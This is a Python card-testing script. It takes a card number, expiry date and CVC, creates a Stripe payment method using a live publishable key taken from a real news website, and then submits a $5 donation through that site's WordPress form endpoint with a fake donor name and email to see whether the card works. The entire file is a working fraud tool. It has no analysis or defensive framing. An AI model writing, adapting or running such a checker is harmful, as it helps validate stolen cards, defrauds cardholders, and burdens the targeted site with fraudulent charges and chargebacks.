import requests

def Tele(ccx):
    # Process the input
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    
    # Handle the year format
    if "20" in yy:
        yy = yy.split("20")[1]

    # Create a session
    r = requests.session()

    # Headers for the first request
    headers_1 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    # Data for the first request
    data_1 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'

    # First POST request to Stripe
    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers_1, data=data_1)

    # Check if the response contains 'id'
    if 'id' not in r1.json():
        return {'error': 'Failed to retrieve payment method ID'}

    pm = r1.json()['id']

    # Cookies for the second request
    cookies = {
        '_ga_CR8R7FTPV8': 'GS1.1.1729167706.1.0.1729167706.60.0.0',
        '_ga': 'GA1.1.1407958477.1729167706',
        '_clck': 'bvy00e%7C2%7Cfq3%7C0%7C1751',
        '_clsk': '1w9ycaf%7C1729167724263%7C1%7C1%7Ce.clarity.ms%2Fcollect',
        'cookieconsent_status': 'dismiss',
    }

    # Headers for the second request
    headers_2 = {
        'authority': 'tasmanianinquirer.com.au',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://tasmanianinquirer.com.au',
        'referer': 'https://tasmanianinquirer.com.au/contribute/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Parameters for the second request
    params = {
        't': '1729167784840',
    }

    # Data for the second request
    data_2 = {
        'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f58e6c4dec&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=test%40gmail.com&names_1%5Bfirst_name%5D=waznim&names_1%5Blast_name%5D=ey%20ey&payment_method=stripe&checkbox%5B%5D=&__stripe_payment_method_id=' + str(pm),
        'action': 'fluentform_submit',
        'form_id': '3',
    }

    # Second POST request to the server
    r2 = r.post(
        'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
        params=params,
        cookies=cookies,
        headers=headers_2,
        data=data_2,
    )

    # Return the response from the second request
    return r2.json()